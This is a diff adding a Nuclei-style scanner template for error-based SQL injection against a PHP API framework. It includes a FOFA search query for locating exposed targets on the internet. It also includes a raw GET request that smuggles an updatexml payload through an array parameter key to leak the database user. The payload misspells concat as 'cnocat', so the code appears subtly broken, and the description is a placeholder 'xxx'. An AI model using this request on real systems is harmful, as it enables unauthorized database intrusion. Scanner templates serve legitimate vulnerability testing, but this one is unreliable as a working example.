@@ -1,0 +1,26 @@
+id: sql-injection
+info:
+  name: sql-injection
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="十年磨一剑-为API开发设计的高性能框架" && title!="系统发生错误" && title!="System Error" && title!="404-百房网" && icon_hash="1165838194"
+http:
+  - raw:
+      - |
+        GET /index.php?ids[0,updatexml(0,cnocat(0xa,user()),0)]=1 HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root@"
